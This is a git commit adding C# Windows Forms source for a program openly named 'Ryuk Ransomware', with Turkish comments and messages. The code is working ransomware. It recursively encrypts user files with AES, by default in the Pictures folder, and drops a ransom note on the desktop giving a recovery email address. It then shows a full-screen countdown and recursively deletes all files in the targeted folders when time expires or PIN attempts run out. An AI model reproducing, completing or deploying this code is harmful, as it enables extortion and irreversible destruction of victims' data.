118d2f814acca718283ce1fca4904812e360f231
erenonder0 <eerenonder0@gmail.com>
2025-05-15 21:45:28 +0300

    first commit

---
+++ Ryuk Ransomware/RyukEncrypter.Designer.cs
@@ -0,0 +1,212 @@
+﻿namespace Ryuk_Ransomware
+{
+    partial class RyukEncrypter
+    {
+        /// <summary>
+        ///Gerekli tasarımcı değişkeni.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///Kullanılan tüm kaynakları temizleyin.
+        /// </summary>
+        ///<param name="disposing">yönetilen kaynaklar dispose edilmeliyse doğru; aksi halde yanlış.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer üretilen kod
+
+        /// <summary>
+        /// Tasarımcı desteği için gerekli metot - bu metodun 
+        ///içeriğini kod düzenleyici ile değiştirmeyin.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.button1 = new System.Windows.Forms.Button();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // timer1
+            // 
+            this.timer1.Interval = 1000;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.White;
+            this.button1.Enabled = false;
+            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.button1.Location = new System.Drawing.Point(1333, 876);
+            this.button1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(287, 70);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "DECRYPT FİLE";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.pictureBox1.Image = global::Ryuk_Ransomware.Properties.Resources.sa;
+            this.pictureBox1.Location = new System.Drawing.Point(1288, 16);
+            this.pictureBox1.Margin = new System.Windows.Forms.Padding(4);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(439, 298);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox1.TabIndex = 5;
+            this.pictureBox1.TabStop = false;
+            // 
+            // textBox3
+            // 
+            this.textBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.textBox3.Location = new System.Drawing.Point(1269, 815);
+            this.textBox3.Margin = new System.Windows.Forms.Padding(4);
+            this.textBox3.Multiline = true;
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(393, 27);
+            this.textBox3.TabIndex = 11;
+            // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.SystemColors.InactiveCaptionText;
+            this.textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 60F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.textBox1.ForeColor = System.Drawing.Color.DarkRed;
+            this.textBox1.Location = new System.Drawing.Point(1136, 608);
+            this.textBox1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.ReadOnly = true;
+            this.textBox1.Size = new System.Drawing.Size(705, 111);
+            this.textBox1.TabIndex = 3;
+            this.textBox1.Text = "00:00:59";
+            this.textBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.Color.White;
+            this.button2.Location = new System.Drawing.Point(1689, 802);
+            this.button2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(153, 47);
+            this.button2.TabIndex = 1;
+            this.button2.Text = "Kontrol";
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // textBox2
+            // 
+            this.textBox2.BackColor = System.Drawing.SystemColors.InactiveCaptionText;
+            this.textBox2.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.textBox2.Font = new System.Drawing.Font("Verdana", 25F);
+            this.textBox2.ForeColor = System.Drawing.Color.Maroon;
+            this.textBox2.Location = new System.Drawing.Point(1136, 409);
+            this.textBox2.Margin = new System.Windows.Forms.Padding(4);
+            this.textBox2.Multiline = true;
+            this.textBox2.Name = "textBox2";
+            this.textBox2.ReadOnly = true;
+            this.textBox2.Size = new System.Drawing.Size(740, 171);
+            this.textBox2.TabIndex = 9;
+            this.textBox2.Text = "Dosyalarını geri almak için zaman dolmadan belirtilen talimatları yapmalısın !";
+            this.textBox2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.label2.Cursor = System.Windows.Forms.Cursors.Default;
+            this.label2.Font = new System.Drawing.Font("Verdana", 30F);
+            this.label2.ForeColor = System.Drawing.Color.Maroon;
+            this.label2.Location = new System.Drawing.Point(1127, 332);
+            this.label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(671, 60);
+            this.label2.TabIndex = 7;
+            this.label2.Text = "n adet dosyan şifrelendi !";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.label1.Cursor = System.Windows.Forms.Cursors.Default;
+            this.label1.Font = new System.Drawing.Font("Verdana", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label1.ForeColor = System.Drawing.Color.Maroon;
+            this.label1.Location = new System.Drawing.Point(1127, 802);
+            this.label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(151, 48);
+            this.label1.TabIndex = 10;
+            this.label1.Text = "PIN = ";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.label3.Cursor = System.Windows.Forms.Cursors.Default;
+            this.label3.Font = new System.Drawing.Font("Verdana", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label3.ForeColor = System.Drawing.Color.Maroon;
+            this.label3.Location = new System.Drawing.Point(1347, 786);
+            this.label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(251, 25);
+            this.label3.TabIndex = 12;
+            this.label3.Text = "Kalan Deneme Hakkı: n";
+            // 
+            // RyukEncrypter
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = global::Ryuk_Ransomware.Properties.Resources.Death_Note_Ryuk_Wallpaper_4K_173967;
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.ClientSize = new System.Drawing.Size(1920, 1080);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.textBox3);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
+            this.Name = "RyukEncrypter";
+            this.Text = "Ryuk Ransomware";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label3;
+    }
+}
+
---
+++ Ryuk Ransomware/RyukEncrypter.cs
@@ -0,0 +1,450 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Security.Cryptography;
+using System.Diagnostics;
+using System.Drawing.Text;
+using System.Xml;
+
+namespace Ryuk_Ransomware
+{
+    public partial class RyukEncrypter : Form
+    {
+        //-------------- RANSOMWARE AYARLARI --------------//
+        private const bool ORIJINAL_DOSYALARI_SIL = false;
+        private const bool MASAUSTU_SIFRELE = false;
+        private const bool DOKUMANLARI_SIFRELE = false;
+        private const bool FOTOGRAFLARI_SIFRELE = true;
+        private const string SIFRELENMIS_DOSYA_UZANTISI = ".ryuk";
+        private const string ENCRYPT_SIFRESI = "Password1";
+        private const string EMAIL_ADRESI = "this.email.address@gmail.com";
+        private const bool SIFRELENMIS_DOSYALARI_SIL = true;
+        private int kalanZaman = 120; //saniye cinsinden kalan zaman
+        private const string BUTON_SIFRESI = "ryukransom";
+        int butonSifreDenemeHakki = 3;
+
+        //--------------------  BİTTİ --------------------//
+
+        private static string SIFRELEME_LOG = "";
+        private string RANSOM_MESAJ =
+            "Bütün dosyalarının şifrelendi. \n\n" +
+            "Dosyalarını kurtarmak için mail atman gereken adres: " + EMAIL_ADRESI + "\n\n" +
+            "İyi Günler Dilerim :) \n\n"+
+            "Ölüm defterine ismi yazılan dosyalar: \n\n" +
+            "----------------------------------------\n";
+        private static string MASAUSTU_KLASORU = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); //Masaüstü konumunun bilgisini alır.
+        private static string DOKUMANLAR_KLASORU = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);   //Dokümanlar konumunun bilgisini alır.
+        private static string FOTOGRAFLAR_KLASORU = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);   //Fotoğraflar konumunun bilgisini alır.
+        private static int sifrelenmisDosyaSayaci = 0;
+
+        private static string SİFRECOZME_LOG = "";
+        private static int cozulenDosyaSayaci = 0;
+
+        public RyukEncrypter()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            
+            if(MASAUSTU_SIFRELE)
+            {
+                sifrelenecekKlasorIcerikleri(MASAUSTU_KLASORU);
+            }
+
+            if (DOKUMANLARI_SIFRELE)
+            {
+                sifrelenecekKlasorIcerikleri(DOKUMANLAR_KLASORU);
+            }
+
+            if (FOTOGRAFLARI_SIFRELE)
+            {
+                sifrelenecekKlasorIcerikleri(FOTOGRAFLAR_KLASORU);
+            }
+
+            if (sifrelenmisDosyaSayaci > 0)
+            {
+                sifrelemeSonrasiForm();
+                ransomMesajiGoster();
+            }
+
+            else
+            {
+                MessageBox.Show("Şifrelenecek Dosya Bulunamadı");
+                Application.Exit();
+            }
+            
+        }
+
+        private void ransomMesajiGoster()
+        {
+            StreamWriter ransomWriter = new StreamWriter(MASAUSTU_KLASORU + @"\____KURTARMA__DOSYASI__" + SIFRELENMIS_DOSYA_UZANTISI + ".txt");
+            ransomWriter.WriteLine(RANSOM_MESAJ);
+            ransomWriter.WriteLine(SIFRELEME_LOG);
+            ransomWriter.Close();
+        }
+
+        private void sifrelemeSonrasiForm()
+        {
+            timer1.Enabled = true;
+            UpdateTextBox();
+            this.Opacity = 100;
+            this.WindowState = FormWindowState.Maximized;
+            label3.Text = "Kalan Deneme Hakkı: " + butonSifreDenemeHakki;
+            label2.Text = sifrelenmisDosyaSayaci +" adet dosyan şifrelendi !";
+
+        }
+        static void sifrelenecekKlasorIcerikleri(string sDir)
+        {
+            try
+            {
+                foreach(string d in Directory.GetFiles(sDir))
+                {
+                    if(!d.Contains(SIFRELENMIS_DOSYA_UZANTISI))
+                    {
+                        Console.Out.WriteLine("Şifreleniyor: " + d);
+                        if(!(d == "Ryuk Ransomware"))
+                        {
+                            DosyaSifrele(d, ENCRYPT_SIFRESI);
+                        }
+                    }
+                }
+
+                foreach(string k in Directory.GetDirectories(sDir))
+                {
+                    sifrelenecekKlasorIcerikleri(k);
+                }
+            }
+            catch(System.Exception excpt)
+            {
+                Console.WriteLine(excpt.Message);
+            }
+        }
+
+        private static void DosyaSifrele(string inputDosya, string sifre)
+        {
+            //AES SİFRELEMESİ KULLANACAĞIM
+
+            //random salt oluşturma
+            byte[] salt = RandomSaltOlustur();
+
+            //Dosyanı çıkış ismini yarat
+            FileStream fsCrypt = new FileStream(inputDosya + SIFRELENMIS_DOSYA_UZANTISI, FileMode.Create);
+
+            //Şifreyi Byte'lara çevirme
+            byte[] sifreByte = System.Text.Encoding.UTF8.GetBytes(sifre);
+
+            //Rijndael simetrik şifrelemenin kurulması
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            AES.Padding = PaddingMode.PKCS7;
+
+            var key = new Rfc2898DeriveBytes(sifreByte, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+            AES.Mode = CipherMode.CBC;
+
+            //oluşturulan salt değerini salt'ı dosyanın başına yazıyoruz.
+            fsCrypt.Write(salt, 0, salt.Length);
+
+            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
+
+            FileStream fsIn = new FileStream(inputDosya, FileMode.Open);
+
+            byte[] buffer = new byte[1048576];
+            int read;
+
+            try
+            {
+                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    cs.Write(buffer, 0, read);
+                }
+            }
+
+            catch(Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+            finally
+            {
+                SIFRELEME_LOG += inputDosya + "\n";
+                sifrelenmisDosyaSayaci++;
+                cs.Close();
+                fsCrypt.Close();
+                fsIn.Close();
+               
+                if (ORIJINAL_DOSYALARI_SIL)
+                {
+                    try
+                    {
+                        File.Delete(inputDosya);
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show("HATA: " + ex.Message);
+
+                    }
+
+                }
+            }
+        }
+
+        public static byte[] RandomSaltOlustur()
+        {
+            byte[] data = new byte[32];
+            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
+            {
+                for(int i= 0; i<10; i++)
+                {
+                    rng.GetBytes(data);
+                }
+            }
+
+            return data;
+        }
+
+        private static void DosyaSifreCoz(string inputDosya, string outputDosya, string sifre)
+        {
+            byte[] sifreBytes = System.Text.Encoding.UTF8.GetBytes(sifre);
+            byte[] salt = new byte[32];
+
+            FileStream cryptoFileStream = new FileStream(inputDosya, FileMode.Open);
+            cryptoFileStream.Read(salt, 0, salt.Length);
+
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            var key = new Rfc2898DeriveBytes(sifreBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+            AES.Padding = PaddingMode.PKCS7;
+            AES.Mode = CipherMode.CBC;
+
+            CryptoStream cryptoStream = new CryptoStream(cryptoFileStream, AES.CreateDecryptor(), CryptoStreamMode.Read);
+
+            FileStream fileStreamOutput = new FileStream(outputDosya, FileMode.Create);
+
+            int read;
+            byte[] buffer = new byte[1048576];
+            try
+            {
+                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    fileStreamOutput.Write(buffer, 0, read);
+                }
+            }
+            catch (CryptographicException ex_CryptographicException)
+            {
+                Console.WriteLine("CryptographicException hata: " + ex_CryptographicException.Message);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Hata: " + ex.Message);
+            }
+
+            try
+            {
+                cryptoStream.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(" CryptoStream Kapatma Hatası: " + ex.Message);
+            }
+            finally
+            {
+                fileStreamOutput.Close();
+                cryptoFileStream.Close();
+                cryptoStream.Close();
+                if(SIFRELENMIS_DOSYALARI_SIL)
+                {
+                  File.Delete(inputDosya);
+                }
+                SİFRECOZME_LOG += inputDosya + "\n";
+                cozulenDosyaSayaci++;
+            }
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            
+            if (MASAUSTU_SIFRELE)
+            {
+                sifresiCozulecekKlasorIcerikleri(MASAUSTU_KLASORU);
+            }
+
+            if (DOKUMANLARI_SIFRELE)
+            {
+                sifresiCozulecekKlasorIcerikleri(DOKUMANLAR_KLASORU);
+            }
+
+            if (FOTOGRAFLARI_SIFRELE)
+            {
+                sifresiCozulecekKlasorIcerikleri(FOTOGRAFLAR_KLASORU);
+            }
+            
+
+            if (cozulenDosyaSayaci > 0)
+            {
+                sifreCozmeLogGoster();
+                MessageBox.Show("ŞİFRELEME ÇÖZÜLDÜ");
+                sifreCozmeSonrasiForm();
+            }
+            else
+            {
+                Console.Out.WriteLine("No files to encrypt.");
+            }
+        }
+
+        static void sifresiCozulecekKlasorIcerikleri(string sDİR)
+        {
+            try
+            {
+                foreach(string dosya in Directory.GetFiles(sDİR))
+                    if(dosyaSifreliMi(dosya))
+                    {
+                        DosyaSifreCoz(dosya, dosya.Substring(0, dosya.Length - SIFRELENMIS_DOSYA_UZANTISI.Length), ENCRYPT_SIFRESI);
+                    }
+                foreach(string klasor in Directory.GetDirectories(sDİR))
+                {
+                    sifresiCozulecekKlasorIcerikleri(klasor);
+                }
+            }
+            catch (System.Exception excpt)
+            {
+                Console.WriteLine(excpt.Message);
+            }
+        }
+
+        private static bool dosyaSifreliMi(string inputDosya)
+        {
+            if (inputDosya.Contains(SIFRELENMIS_DOSYA_UZANTISI))
+                if (inputDosya.Substring(inputDosya.Length - SIFRELENMIS_DOSYA_UZANTISI.Length, SIFRELENMIS_DOSYA_UZANTISI.Length) == SIFRELENMIS_DOSYA_UZANTISI)
+                    return true;
+
+            return false;
+        }
+        
+        private static void sifreCozmeLogGoster()
+        {
+            StreamWriter ransomWriter = new StreamWriter(MASAUSTU_KLASORU + @"\___DECRYPTION_LOG.txt");
+            ransomWriter.WriteLine(cozulenDosyaSayaci + " dosya şifresi çözüldü." +
+                "\n----------------------------------------\n" +
+                SİFRECOZME_LOG);
+            ransomWriter.Close();
+        }
+
+        private void sifreCozmeSonrasiForm()
+        {
+            Application.Exit();
+        }
+        private void button2_Click(object sender, EventArgs e)
+        {
+            label3.Text = "Kalan Deneme Hakkı: " + butonSifreDenemeHakki;
+            if (butonSifreDenemeHakki > 0)
+            {
+                if (textBox3.Text == BUTON_SIFRESI)
+                {
+                    timer1.Enabled = false;
+                    button1.Enabled = true;
+                    button2.Enabled = false;
+                }
+                else
+                {
+                    butonSifreDenemeHakki--;
+                }
+            }
+            else if(butonSifreDenemeHakki == 0)
+            {
+                dosyaOldurme();
+                timer1.Enabled = false;
+                MessageBox.Show("DENEME HAKKINIZ DOLDU ! BÜTÜN DOSYALAR SİLİNDİ");
+                Application.Exit();
+            }
+            
+            
+        }
+        private void UpdateTextBox()
+        {
+            int saat = kalanZaman / 3600;
+            int dakika = (kalanZaman % 3600) / 60;
+            int saniye = kalanZaman % 60;
+            textBox1.Text = $"{saat:D2}:{dakika:D2}:{saniye:D2}";
+        }
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            if (kalanZaman > 0)
+            {
+                kalanZaman--; // Kalan zamanı bir azalt
+                UpdateTextBox(); // TextBox'ı güncelle
+            }
+
+            if(kalanZaman == 0)
+            {
+                timer1.Enabled=false;
+                MessageBox.Show("VAKİT DOLDU");
+                dosyaOldurme();
+                Application.Exit();
+            }
+        }
+
+        private static void dosyaOldurme()
+        {
+            if (MASAUSTU_SIFRELE)
+            {
+                oldurulecekKlasorler(MASAUSTU_KLASORU);
+            }
+
+            if (DOKUMANLARI_SIFRELE)
+            {
+                oldurulecekKlasorler(DOKUMANLAR_KLASORU);
+            }
+
+            if (FOTOGRAFLARI_SIFRELE)
+            {
+                oldurulecekKlasorler(FOTOGRAFLAR_KLASORU);
+            }
+
+        }
+
+        static void oldurulecekKlasorler(string sDİR)
+        {
+            try
+            {
+                foreach (string dosya in Directory.GetFiles(sDİR))
+                {
+                  File.Delete(dosya);
+                }
+                foreach (string klasor in Directory.GetDirectories(sDİR))
+                {
+                    oldurulecekKlasorler(klasor);
+                }
+            }
+            catch (System.Exception excpt)
+            {
+                Console.WriteLine(excpt.Message);
+            }
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
